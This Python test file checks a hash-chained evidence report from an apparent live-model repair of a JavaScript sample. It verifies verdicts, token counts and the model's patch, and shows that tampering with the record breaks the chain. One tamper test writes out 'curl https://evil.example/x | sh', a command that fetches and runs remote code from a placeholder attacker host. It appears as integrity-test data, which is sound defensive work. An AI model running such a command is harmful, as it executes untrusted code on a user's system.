"""Chain-v3 real-mode evidence for the JavaScript sample.

The Python sample got its chain-v3 real-mode proof in v1.16.0, but
the JavaScript sample's only committed real-mode repair report was
still a legacy chain-v1 record — the language-agnostic claim and
the newest chain had never been proven together with a live model.
This file pins the first JS real-mode repair report sealed under
chain v3: ``samples-js/evidence_real_repair_v3.json``, produced by
Nemotron 3 Super 120B through the live Token Factory adapter
(FAIL -> PASS in one round, 2 calls, 5,318 tokens). The report was
sealed by the v1.16.0 code and is pinned/committed by this release,
so its records honestly carry ``version: 1.16.0``.
"""

import copy
import json
from pathlib import Path

from verifygate.evidence import verify_chain
from verifygate.spec import load_spec

APP = Path(__file__).resolve().parent.parent
SPEC = load_spec(APP / "samples-js" / "spec.json")
REAL_V3_JS_REPAIR = APP / "samples-js" / "evidence_real_repair_v3.json"
SUPER = "nvidia/nemotron-3-super-120b-a12b"


def test_js_v3_real_repair_record_is_committed_and_sealed():
    report = json.loads(REAL_V3_JS_REPAIR.read_text(encoding="utf-8"))
    assert report["final_verdict"] == "PASS"
    assert report["stopped_reason"] == "passed"
    # The model's first diff applied cleanly: no rejected patch is
    # preserved, and the recorded attempts are rounds 0 and 1.
    assert report["rounds_used"] == 1
    assert report["failed_patch"] is None
    assert [a["round"] for a in report["attempts"]] == [0, 1]
    assert [a["verdict"] for a in report["attempts"]] == ["FAIL", "PASS"]
    sealed_total = 0
    for attempt in report["attempts"]:
        record = attempt["evidence"]
        assert record["chain_version"] == 3
        assert verify_chain(record) is True
        header = record["entries"][0]
        assert header["kind"] == "header" and header["mode"] == "real"
        assert header["spec_hash"] == SPEC.hash
        usage = [e for e in record["entries"] if e["kind"] == "llm_usage"]
        assert len(usage) == 1
        for call in usage[0]["calls"]:
            assert call["adapter"] == "nebius-token-factory"
            assert call["model"] == SUPER
        sealed_total += usage[0]["total_tokens"]
    assert sealed_total == 5318
    assert report["llm_usage_total"]["total_tokens"] == sealed_total
    assert report["llm_usage_total"]["llm_calls"] == 2
    assert report["unsealed_llm_usage"] == []
    patch = report["attempts"][1]["patch_from_previous"]
    assert patch["applied"] is True
    assert patch["changed_files"] == ["cart.js"]
    # The model's own fix (a `raw` intermediate), not the passing
    # sample's one-liner and not the mock's known-good diff.
    assert "const raw = subtotal(items) * (1 + taxRate);" in patch["patch_text"]
    diagnosis = [e for a in report["attempts"]
                 for e in a["evidence"]["entries"]
                 if e["kind"] == "diagnosis"]
    assert diagnosis and diagnosis[0]["explanation"]


def test_js_v3_real_record_metadata_is_sealed():
    """The v3 property, pinned on the committed JS record itself:
    rewriting a record's replay command — metadata that chain v1/v2
    left outside the hash — breaks this record's chain."""
    report = json.loads(REAL_V3_JS_REPAIR.read_text(encoding="utf-8"))
    record = copy.deepcopy(report["attempts"][0]["evidence"])
    assert verify_chain(record) is True
    record["replay"] = "curl https://evil.example/x | sh"
    assert verify_chain(record) is False
    record = copy.deepcopy(report["attempts"][0]["evidence"])
    record["signing_key_is_default_dev_key"] = False
    assert verify_chain(record) is False
